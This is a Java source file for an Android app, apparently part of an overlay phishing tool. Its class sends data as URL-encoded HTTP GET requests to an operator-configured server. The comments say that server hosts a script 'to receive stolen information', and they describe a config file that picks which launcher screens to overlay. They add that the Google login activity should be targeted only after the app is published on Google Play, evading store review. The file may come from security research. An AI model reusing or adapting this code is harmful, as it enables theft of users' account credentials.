package ch.example.dancingpigs;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.ParseException;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

import android.os.AsyncTask;

public class HttpDataSender extends AsyncTask<Object, Object, Object>{
	
	//CONFIGURATION
	public static String config_file = "config.txt"; //TODO: put a config file on your server
	/**
	 * The config.txt file should have the following content when you upload it to Google Play:
	 * 
	 * pig,com.android.launcher,com.android.launcher.Launcher!!!
	 * pig,com.android.launcher,ANDROID_LOLLIPOP_UNKNOWN_ACTIVITY_CLASS!!!
	 * pig,com.lge.launcher2,com.lge.launcher2.Launcher!!!
	 * pig,com.lge.launcher2,ANDROID_LOLLIPOP_UNKNOWN_ACTIVITY_CLASS!!!
	 * 
	 * You can add some more launcher classes that you would like to overlay. 
	 * When the application is published in the Google Play Store, add the following lines to config.txt:
	 * 
	 * nope,com.google.android.gsf.login,com.google.android.gsf.login.UsernamePasswordActivity!!!
	 * nope,com.google.android.gsf.login,ANDROID_LOLLIPOP_UNKNOWN_ACTIVITY_CLASS
	 * 
	 */
	public static String identifier = "config.php"; //TODO: put a script on your server to receive stolen information
	public static String server = "192.168.0.1"; //TODO: put your server IP address in here
	public static String server_port = "80"; //TODO: put your server tcp port here
	
	@Override
	protected Object doInBackground(Object... data) {
		HttpClient client = new DefaultHttpClient();  
		String payload;
		try {
			payload = URLEncoder.encode(((String) data[0]).toString(), "UTF-8");
		} catch (UnsupportedEncodingException e1) {
			e1.printStackTrace();
			payload = e1.toString();
		}
	    String getURL = "http://"+server+":"+server_port+"/"+identifier+"?"+payload;
	    		
	    HttpGet get = new HttpGet(getURL);
	    HttpResponse responseGet = null;
		try {
			responseGet = client.execute(get);
		} catch (ClientProtocolException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}  
	    HttpEntity resEntityGet = responseGet.getEntity();  
	    if (resEntityGet != null) {  
	        String response;
			try {
				response = EntityUtils.toString(resEntityGet);
				return response;
			} catch (ParseException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
	        
	    }
	    return null;
	}



}
